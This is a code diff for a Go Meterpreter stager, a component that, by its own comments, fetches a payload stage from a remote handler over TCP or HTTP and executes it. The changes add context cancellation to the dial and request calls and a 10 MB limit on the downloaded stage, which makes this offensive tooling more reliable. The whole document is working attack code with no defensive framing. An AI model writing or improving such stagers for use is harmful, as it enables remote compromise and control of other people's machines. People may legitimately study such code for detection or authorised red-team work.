@@ -57,6 +57,7 @@ type Config struct {
 // Stager manages the Meterpreter staging process.
 type Stager struct {
 	config *Config
+	ctx    context.Context
 }
 
 // NewStager creates a new Meterpreter stager.
@@ -65,7 +66,8 @@ func NewStager(cfg *Config) *Stager {
 }
 
 // Stage fetches and executes the Meterpreter stage from the handler.
-func (s *Stager) Stage(_ context.Context) error {
+func (s *Stager) Stage(ctx context.Context) error {
+	s.ctx = ctx
 	return s.platformSpecificStage()
 }
 
@@ -89,7 +91,7 @@ func (s *Stager) fetchStageTCP() ([]byte, error) {
 		Timeout: s.config.Timeout,
 	}
 
-	conn, err := dialer.Dial("tcp", address)
+	conn, err := dialer.DialContext(s.ctx, "tcp", address)
 	if err != nil {
 		return nil, fmt.Errorf("TCP dial failed: %w", err)
 	}
@@ -135,7 +137,7 @@ func (s *Stager) fetchStageHTTP() ([]byte, error) {
 		Transport: httpTransport,
 	}
 
-	req, err := http.NewRequest("GET", url, nil)
+	req, err := http.NewRequestWithContext(s.ctx, "GET", url, nil)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
@@ -152,7 +154,8 @@ func (s *Stager) fetchStageHTTP() ([]byte, error) {
 		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
 	}
 
-	stage, err := io.ReadAll(resp.Body)
+	const maxStageSize = 10 * 1024 * 1024 // 10 MB
+	stage, err := io.ReadAll(io.LimitReader(resp.Body, maxStageSize))
 	if err != nil {
 		return nil, fmt.Errorf("failed to read stage: %w", err)
 	}
